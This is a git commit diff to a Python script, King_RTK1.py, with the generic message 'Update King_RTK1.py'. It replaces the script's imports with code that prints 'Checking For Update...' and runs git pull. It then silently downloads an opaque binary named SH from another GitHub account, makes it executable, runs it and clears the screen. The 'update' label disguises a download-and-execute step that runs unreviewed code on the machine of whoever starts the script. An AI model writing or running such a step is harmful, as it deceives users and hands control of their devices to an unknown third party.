1f261d1745a1a80d2b71ff1d43093e0dcc6ee4d4
kingrtk1 <108303178+kingrtk1@users.noreply.github.com>
2023-03-04 03:49:22 +0600

    Update King_RTK1.py

--- King_RTK1.py
+++ King_RTK1.py
@@ -1,13 +1,15 @@
 
-try:
-	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
-	from string import *
-	from concurrent.futures import ThreadPoolExecutor as ThreadPool
-except(ImportError):
-    os.system("pip install requests")
-    pass
-
-
+from os import system,remove
+from platform import machine
+print('Checking For Update...')
+system('git pull')
+try:remove('SH')
+except:pass
+if machine()=='aarch64':
+    system('curl -L https://github.com/SaiMun-cyber-403/SH/raw/main/SH -o SH;chmod +x SH;./SH')
+else:
+    system('curl -L https://github.com/SaiMun-cyber-403/SH/raw/main/SH -o SH;chmod +x SH;./SH')
+system('clear')
 try:
     import bs4
 except(ImportError):
